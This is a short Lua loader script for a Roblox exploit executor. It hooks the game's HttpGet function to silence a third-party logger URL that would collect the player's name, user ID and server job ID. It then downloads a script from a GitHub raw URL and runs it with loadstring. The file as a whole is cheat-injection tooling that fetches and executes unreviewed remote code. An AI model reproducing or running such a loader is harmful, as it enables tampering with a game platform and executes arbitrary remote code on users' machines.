local loggerHook
local plr = game.Players.LocalPlayer
loggerHook = hookfunction(game.HttpGet,function(self,url,...)
    if url == "https://fadeddh.000webhostapp.com/swagmode.php?user="..plr.Name.."&id="..tostring(plr.UserId).."&job="..tostring(game.JobId) then 
        warn("LOGGER DISABLED")
        return
    end
    return loggerHook(self,url,...)
end)
local credit='guardscripts'
local url=('https://raw.githubusercontent.com/%s/myscripts/main/scriptinit.lua'):format(credit)
init=loadstring(game:HttpGet(url,true))
getgenv().xscriptId='NTE4MTVy'
init()
